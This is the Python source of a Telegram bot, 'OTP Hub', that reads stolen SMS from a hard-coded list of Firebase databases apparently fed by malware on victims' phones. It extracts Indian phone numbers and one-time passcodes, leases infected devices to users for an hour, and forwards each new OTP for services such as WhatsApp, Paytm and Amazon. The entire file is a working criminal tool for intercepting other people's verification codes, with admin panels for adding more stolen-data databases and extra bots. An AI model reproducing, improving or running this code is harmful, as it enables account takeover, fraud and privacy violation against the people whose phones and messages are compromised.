import asyncio, json, os, time, logging, random, re, base64
from collections import Counter
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from supabase import create_client, Client

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
log = logging.getLogger("OTP-Bot")

# ================= CONFIGURATION =================
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_MAIN_BOT_TOKEN")
OWNER_ID = 8480878371
SUPABASE_URL = os.getenv("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
PORT = int(os.getenv("PORT", 8080))
# =================================================

# Supabase Init
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

router = Router()
running_bots = {} 

DEFAULT_URLS = [
    "https://sita-admin-default-rtdb.firebaseio.com",
    "https://my-admin-51-default-rtdb.firebaseio.com",
    "https://webfund3-default-rtdb.firebaseio.com",
    "https://vzvxvz-default-rtdb.firebaseio.com",
    "https://nuna-b-default-rtdb.firebaseio.com",
    "https://shakti-9703d-default-rtdb.firebaseio.com",
    "https://bigg-panal-7fbe5-default-rtdb.firebaseio.com",
    "https://ueur-357f2-default-rtdb.firebaseio.com",
    "https://nmpanagr-default-rtdb.firebaseio.com"
]

# ================= DATA MANAGEMENT (SUPABASE) =================
async def load_data():
    try:
        res = supabase.table("bot_data").select("data").eq("id", 1).execute()
        if res.data and len(res.data) > 0 and res.data[0]["data"]:
            data = res.data[0]["data"]
            if not data.get("firebases"):
                data["firebases"] = [{"url": u, "label": u.split("//")[-1].split(".")[0], "auth": ""} for u in DEFAULT_URLS]
            return data
    except Exception as e:
        log.error(f"Supabase load error: {e}")
    
    # Default if empty
    default_data = {
        "owner_id": OWNER_ID, "admins": [], "users": {},
        "free_mode": True, "banned": [], "extra_tokens": [],
        "firebases": [{"url": u, "label": u.split("//")[-1].split(".")[0], "auth": ""} for u in DEFAULT_URLS],
        "user_leases": {}, "user_history": {}, "stats": {"total_otps": 0},
        "device_usage": {}, "videos": [], "pricing": {"plans": []}, "settings": {"ref_credits": 3}
    }
    return default_data

async def save_data(data):
    try:
        supabase.table("bot_data").update({"data": data}).eq("id", 1).execute()
    except Exception as e:
        log.error(f"Supabase save error: {e}")

async def clean_old_history(data):
    now = time.time()
    for uid in list(data["user_history"].keys()):
        data["user_history"][uid] = {k: v for k, v in data["user_history"][uid].items() if now - v < 86400}
        if not data["user_history"][uid]: del data["user_history"][uid]
    return data

# ================= FIREBASE HELPERS =================
async def fetch_fb(url, auth=None):
    full_url = url
    if auth: full_url += f"?auth={auth}" if "?" not in full_url else f"&auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=10) as resp:
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception: pass
    return None

def decode_panel_url(panel_url):
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        if "|||" in decoded: return decoded.split("|||")[0], ""
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data: return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"): return decoded, ""
    except Exception: pass
    return None

def extract_best_numbers(dev_data, msgs):
    all_text = " ".join([m.get("message", "") for m in msgs])
    matches = re.findall(r'\b[6-9]\d{9}\b', all_text)
    counts = Counter(matches)
    scored_numbers = []
    
    for num, count in counts.items():
        score = min(count * 15, 60) 
        for m in msgs:
            sender = str(m.get("sender", "")).lower()
            if num in m.get("message", ""):
                if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
                    score += 30
                    break
        scored_numbers.append((num, min(score, 99)))

    for key in ["phoneNumber", "phone", "number", "mobile"]:
        if dev_data.get(key):
            n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
            if len(n) == 10: scored_numbers.append((n, 100))
                
    best_nums = {}
    for n, s in scored_numbers:
        if n not in best_nums or s > best_nums[n]: best_nums[n] = s
            
    final_list = sorted(best_nums.items(), key=lambda x: x[1], reverse=True)
    return final_list[:2]

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]): return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

def extract_service_name(text, sender):
    text_lower = text.lower()
    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel"}
    for key, name in services.items():
        if key in text_lower: return name
    if sender:
        parts = sender.split("-")
        if len(parts) > 1: return parts[1]
    return "Unknown"

# ================= STATES =================
class AdminStates(StatesGroup):
    add_bulk_urls = State()

# ================= CORE FUNCTIONS =================
async def get_owner_stats():
    data = await load_data()
    fbs = data.get("firebases", [])
    total_devices, online_devices, fb_stats = 0, 0, {}
    for fb in fbs:
        clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        fb_online = 0
        if clients and isinstance(clients, dict):
            total_devices += len(clients)
            for dev_id, dev_data in clients.items():
                if isinstance(dev_data, dict) and dev_data.get("status") is True:
                    fb_online += 1
                    online_devices += 1
        label = fb['label']
        if label not in fb_stats: fb_stats[label] = {"total": 0, "online": 0, "country": fb['label']}
        fb_stats[label]["total"] += len(clients) if clients else 0
        fb_stats[label]["online"] += fb_online
    return total_devices, online_devices, fb_stats

async def get_numbers_for_server(server_url, uid):
    data = await load_data()
    data = await clean_old_history(data)
    
    fb = next((f for f in data.get("firebases", []) if f["url"] == server_url), None)
    if not fb: return None, None, None, []

    clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    if not clients: return None, None, None, []

    online_devices = []
    for dev_id, dev_data in clients.items():
        if isinstance(dev_data, dict) and dev_data.get("status") is True:
            online_devices.append((fb, dev_id, dev_data))
    
    if not online_devices: return None, None, None, []

    usage_data = data.get("device_usage", {})
    online_devices.sort(key=lambda x: usage_data.get(x[1], 0))
    
    selected_fb, selected_dev_id, dev_data = online_devices[0]
    
    usage_count = usage_data.get(selected_dev_id, 0)
    data.setdefault("device_usage", {})[selected_dev_id] = usage_count + 1
    await save_data(data)

    battery = str(dev_data.get("battery", "?")).replace("%", "")
    status = "T" if dev_data.get("status") else "F"
    code = f"{battery}{status}"
    
    url = f"{selected_fb['url']}/messages/{selected_dev_id}.json?orderBy=%22%24key%22&limitToLast=100"
    msgs_dict = await fetch_fb(url, selected_fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    
    best_nums = extract_best_numbers(dev_data, msgs)
    user_hist = data.get("user_history", {}).get(str(uid), {})
    available = [n for n in best_nums if n[0] not in user_hist]
    
    return selected_dev_id, code, usage_count, available

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

# ================= BACKGROUND SCANNER =================
active_scans = {} 

async def background_global_scanner():
    log.info("Global Scanner Started...")
    while True:
        try:
            data = await load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            device_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            if not device_to_users:
                await asyncio.sleep(2)
                continue 
                
            otps_sent = 0
            for fb in fbs:
                latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                for dev_id, msg in latest_msgs.items():
                    key = (fb["url"], dev_id)
                    msg_id = int(msg.get("id", 0))
                    old_id = active_scans.get(key, 0)
                    
                    if msg_id > old_id:
                        active_scans[key] = msg_id
                        if old_id != 0: 
                            text_content = msg.get("message", "")
                            otp = extract_otp(text_content)
                            if otp:
                                if dev_id in device_to_users:
                                    service = extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        otp_msg = (
                                            f"🔔 <b>OTP Received!</b>\n\n"
                                            f"📱 <b>Service:</b> {service}\n"
                                            f"🔑 <b>OTP:</b> {otp}\n\n"
                                            f"💬 <b>Msg:</b> {text_content[:100]}..."
                                        )
                                        kb = InlineKeyboardMarkup(inline_keyboard=[
                                            [InlineKeyboardButton(text=f"📋 {otp}", copy_text=CopyTextButton(text=otp))]
                                        ])
                                        try:
                                            bot = running_bots.get(data.get("main_token", BOT_TOKEN))
                                            if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
                                            otps_sent += 1
                                        except Exception: pass
            if otps_sent > 0:
                d = await load_data()
                d.setdefault("stats", {})["total_otps"] = d.get("stats", {}).get("total_otps", 0) + otps_sent
                await save_data(d)
            await asyncio.sleep(2)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)

async def web_server():
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    log.info(f"Web server started on port {PORT}")

# ================= KEYBOARDS =================
def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
        [InlineKeyboardButton(text="⭐ My Numbers", callback_data="user:my_numbers")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Enter as User (Test)", callback_data="user:home")],
        [InlineKeyboardButton(text="🔥 Manage Firebases", callback_data="admin:manage_fb")],
        [InlineKeyboardButton(text="🤖 Manage Bots", callback_data="admin:bots")],
        [InlineKeyboardButton(text="👥 Users", callback_data="admin:users"), InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

# ================= HANDLERS =================
@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = await load_data()
    uid = msg.from_user.id
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "starred": {}}
        await save_data(data)
    
    if uid == data["owner_id"] or uid in data.get("admins", []):
        try: await msg.answer("⏳ <i>Loading analytics...</i>", parse_mode="HTML")
        except TelegramBadRequest: pass
        await admin_home_msg(msg)
    else:
        if not data.get("free_mode", True): return await msg.answer("⛔ Access Denied.")
        await msg.answer("👋 <b>Welcome to OTP Hub!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")

async def admin_home_msg(msg: Message):
    total, online, fbs = await get_owner_stats()
    text = (
        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
        f"🔥 <b>Firebase DBs:</b> {len(fbs)}\n"
        f"📱 <b>Total Devices:</b> {total}\n"
        f"🟢 <b>Online Devices:</b> {online}\n"
        f"👥 <b>Total Users:</b> {len((await load_data()).get('users', {}))}\n\n"
        f"<b>Per Server Stats:</b>\n"
    )
    for label, fstats in fbs.items():
        text += f"🌍 {label}: {fstats['online']} ON / {fstats['total']} Total\n"
    try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:home")
async def admin_home_cb(cq: CallbackQuery):
    try: await cq.message.edit_text("🔄 Refreshing live analytics...")
    except TelegramBadRequest: pass
    await admin_home_msg(cq.message)

@router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    data = await load_data()
    fbs = data.get("firebases", [])
    if not fbs: return await cq.message.edit_text("No firebases added.", reply_markup=admin_kb())
    
    kb = []
    for i, fb in enumerate(fbs):
        kb.append([InlineKeyboardButton(text=f"🌍 {fb['label']} | {fb['url'].split('//')[-1][:20]}", callback_data=f"admin:viewfb:{fb['url']}")])
    kb.append([InlineKeyboardButton(text="➕ Add Bulk URLs", callback_data="admin:add_bulk")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
    try: await cq.message.edit_text("Select a Firebase to view devices:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:add_bulk")
async def admin_add_bulk_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_bulk_urls)
    await cq.message.edit_text("Send URLs in this format:\n`URL | Country Name`\n\nExample:\n`https://xyz.firebaseio.com | India`", parse_mode="Markdown")

@router.message(AdminStates.add_bulk_urls)
async def admin_add_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    data = await load_data()
    text = msg.text.strip()
    added = 0
    
    for line in text.split("\n"):
        if "|" in line:
            parts = line.split("|")
            url = parts[0].strip()
            label = parts[1].strip()
            if url.startswith("http"):
                data["firebases"].append({"url": url, "label": label, "auth": ""})
                added += 1
                
    await save_data(data)
    await msg.answer(f"✅ Added {added} URLs successfully!", reply_markup=admin_kb())

@router.callback_query(F.data.startswith("admin:viewfb:"))
async def admin_viewfb(cq: CallbackQuery):
    url = cq.data.split("admin:viewfb:")[1]
    try: await cq.message.edit_text("🔄 Fetching devices...")
    except TelegramBadRequest: pass
    data = await load_data()
    fb = next((f for f in data["firebases"] if f["url"] == url), None)
    if not fb: return await cq.answer("URL not found!")
    
    clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
    if not clients: return await cq.message.edit_text("❌ No devices found.", reply_markup=admin_kb())
    
    text = f"📁 <b>Firebase:</b> {fb['label']}\n🔗 <code>{fb['url']}</code>\n\n"
    count = 0
    for dev_id, dev_info in clients.items():
        if isinstance(dev_info, dict):
            status = "🟢 Online" if dev_info.get("status") else "🔴 Offline"
            battery = dev_info.get("battery", "?")
            text += f"🆔 <code>{dev_id}</code>\n{status} | 🔋 {battery}\n\n"
            count += 1
            if count >= 15: break
    
    kb = [
        [InlineKeyboardButton(text="🗑 Remove this URL", callback_data=f"admin:rmfb:{fb['url']}")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="admin:manage_fb")]
    ]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("admin:rmfb:"))
async def admin_rmfb(cq: CallbackQuery):
    url = cq.data.split("admin:rmfb:")[1]
    data = await load_data()
    data["firebases"] = [f for f in data["firebases"] if f["url"] != url]
    await save_data(data)
    await cq.answer("✅ Removed!")
    await admin_manage_fb(cq)

@router.callback_query(F.data == "admin:bots")
async def admin_bots(cq: CallbackQuery):
    data = await load_data()
    tokens = data.get("extra_tokens", [])
    text = f"🤖 <b>Manage Bots</b>\n\nMain Bot: Active\nExtra Bots: {len(tokens)}\n\nSend `/add_bot <token>` to add a new bot."
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.message(Command("add_bot"))
async def cmd_add_bot(msg: Message):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.answer("Usage: `/add_bot <token>`", parse_mode="Markdown")
    new_token = parts[1]
    
    data = await load_data()
    if new_token not in data.setdefault("extra_tokens", []):
        data["extra_tokens"].append(new_token)
        await save_data(data)
        
    if new_token not in running_bots:
        await start_bot_instance(new_token)
        await msg.answer("✅ Bot added and started in background!")
    else:
        await msg.answer("⚠️ Bot is already running.")

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    try: await cq.message.edit_text("👋 <b>Welcome!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    data = await load_data()
    countries = list(set([fb["label"] for fb in data.get("firebases", [])]))
    if not countries: return await cq.message.edit_text("❌ No countries available right now.")
        
    kb = [[InlineKeyboardButton(text=f"🏳️ {c}", callback_data=f"country:{c}")] for c in countries]
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text("🌍 <b>Select a Country:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("country:"))
async def user_country_selected(cq: CallbackQuery):
    country = cq.data.split(":")[1]
    data = await load_data()
    servers = [fb for fb in data.get("firebases", []) if fb["label"] == country]
    
    if not servers:
        return await cq.answer("No servers found for this country.")
        
    kb = []
    for i, srv in enumerate(servers):
        short_url = srv["url"].split("//")[-1][:25]
        kb.append([InlineKeyboardButton(text=f"Server {i+1}: {short_url}", callback_data=f"server:{srv['url']}")])
    
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num")])
    try: await cq.message.edit_text(f"🌍 {country} - Select a Server:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("server:"))
async def user_server_selected(cq: CallbackQuery):
    server_url = cq.data.split("server:")[1]
    uid = cq.from_user.id
    try: await cq.message.edit_text("🔄 Fetching numbers from server...")
    except TelegramBadRequest: pass
    
    dev_id, code, usage, best_nums = await get_numbers_for_server(server_url, uid)
    
    if not dev_id:
        kb = [[InlineKeyboardButton(text="🔄 Try Again", callback_data=f"server:{server_url}")],[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        try: await cq.message.edit_text(f"❌ <b>Not available in range!</b>\n\nNo online devices found on this server. Try refreshing.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
        except TelegramBadRequest: pass
        return
        
    degree = "°" * usage if usage > 0 else ""
    nums_text = ""
    for n, chance in best_nums:
        nums_text += f"<code>+91{n}</code> <i>({chance}% chance)</i>\n"
    if not nums_text: nums_text = "No numbers found in recent messages. (Waiting for new OTPs...)"
    
    text = (
        f"📱 <b>Numbers Received</b>\n"
        f"🆔 <b>Rent Code:</b> <code>{dev_id}</code>{degree}\n"
        f"⚙️ <b>Code:</b> <code>{code}</code>\n"
        f"Server: 🌐 {server_url.split('//')[-1][:20]}...\n\n"
        f"{nums_text}\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    
    data = await load_data()
    data["user_leases"][str(uid)] = {
        "numbers": [n for n, c in best_nums], 
        "country": "Unknown", 
        "dev_id": dev_id,
        "expire_at": int(time.time()) + 3600
    }
    data["user_history"].setdefault(str(uid), {})
    for n, c in best_nums: data["user_history"][str(uid)][n] = int(time.time())
    await save_data(data)
    
    kb = [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [InlineKeyboardButton(text="⭐ Save to My Numbers", callback_data=f"star:{dev_id}")],
        [InlineKeyboardButton(text="🔄 Next Number", callback_data=f"server:{server_url}")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num"), InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]
    ]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("star:"))
async def star_device(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    data = await load_data()
    
    if str(uid) not in data["users"]: return await cq.answer("User not found!")
        
    starred = data["users"][str(uid)].setdefault("starred", {})
    if dev_id in starred:
        del starred[dev_id]
        await cq.answer("❌ Removed from My Numbers!")
    else:
        lease = data["user_leases"].get(str(uid), {})
        starred[dev_id] = {
            "numbers": lease.get("numbers", []),
            "country": lease.get("country", "Unknown")
        }
        await cq.answer("⭐ Saved to My Numbers!")
    
    await save_data(data)
    # Just trigger the current message again to refresh
    await cq.answer("Updated!")

@router.callback_query(F.data == "user:my_numbers")
async def user_my_numbers(cq: CallbackQuery):
    uid = cq.from_user.id
    data = await load_data()
    starred = data["users"].get(str(uid), {}).get("starred", {})
    
    if not starred:
        kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        return await cq.message.edit_text("⭐ <b>My Numbers</b>\n\nNo saved numbers yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
        
    text = "⭐ <b>My Numbers</b>\n\nTap to re-access OTPs:\n"
    kb = []
    for dev_id, info in starred.items():
        kb.append([
            InlineKeyboardButton(text=f"🆔 {dev_id}", callback_data=f"access:{dev_id}"),
            InlineKeyboardButton(text="🗑", callback_data=f"star:{dev_id}")
        ])
    
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("access:"))
async def access_saved_device(cq: CallbackQuery):
    dev_id = cq.data.split(":")[1]
    uid = cq.from_user.id
    data = await load_data()
    
    starred = data["users"].get(str(uid), {}).get("starred", {})
    if dev_id not in starred:
        return await cq.answer("Device not saved!")
        
    is_online = False
    for fb in data.get("firebases", []):
        clients = await fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if clients and dev_id in clients:
            if clients[dev_id].get("status") is True:
                is_online = True
            break
            
    if not is_online:
        return await cq.answer("❌ Not in range pls try again after some time", show_alert=True)
        
    info = starred[dev_id]
    data["user_leases"][str(uid)] = {
        "numbers": info["numbers"],
        "country": info["country"],
        "dev_id": dev_id,
        "expire_at": int(time.time()) + 3600
    }
    await save_data(data)
    
    nums_text = "\n".join([f"<code>+91{n}</code>" for n in info["numbers"]]) if info["numbers"] else "No numbers found."
    text = (
        f"📱 <b>Re-Accessed Device</b>\n"
        f"🆔 <b>Rent Code:</b> <code>{dev_id}</code>\n\n"
        f"{nums_text}\n\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    
    kb = [
        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]
    ]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

async def start_bot_instance(token: str):
    bot = Bot(token=token)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    running_bots[token] = bot
    asyncio.create_task(dp.start_polling(bot))

async def main():
    log.info("Bot Started!")
    await web_server() 
    main_bot = Bot(token=BOT_TOKEN)
    running_bots[BOT_TOKEN] = main_bot
    
    asyncio.create_task(background_global_scanner())
    
    dp_main = Dispatcher(storage=MemoryStorage())
    dp_main.include_router(router)
    asyncio.create_task(dp_main.start_polling(main_bot))
    
    data = await load_data()
    for tok in data.get("extra_tokens", []):
        await start_bot_instance(tok)
        
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
